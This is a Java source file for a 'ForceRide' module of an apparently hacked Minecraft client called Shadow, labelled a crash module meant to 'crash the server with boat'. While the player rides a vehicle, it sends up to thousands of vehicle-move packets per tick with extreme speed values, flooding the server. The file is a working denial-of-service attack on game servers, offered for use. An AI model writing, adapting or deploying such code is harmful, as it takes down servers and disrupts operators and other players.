package net.shadow.feature.module;

import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;

public class ForceRideCrashModule extends Module {
    static World w;
    final SliderValue repeat = this.config.create("Power", 1000, 1, 5000, 1);
    Entity vehicle;
    Integer x;
    Integer y;
    Integer z;
    Integer boatpos;

    public ForceRideCrashModule() {
        super("ForceRide", "crash the server with boat", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
        if (Shadow.c.player.hasVehicle()) {
            vehicle = Shadow.c.player.getVehicle();
        } else {
            this.setEnabled(false);
            ChatUtils.message("No riding entity found!");
        }
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        for (int b = 0; b < repeat.getThis(); b++) {
            vehicle.prevHorizontalSpeed = Float.MAX_VALUE;
            Vec3d forward = Vec3d.fromPolar(0, vehicle.getYaw()).normalize();
            vehicle.updatePosition(vehicle.getX() + forward.x, vehicle.getY(), vehicle.getX() + forward.z);
            Shadow.c.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(vehicle));
        }
    }

    @Override
    public void onRender() {

    }
}

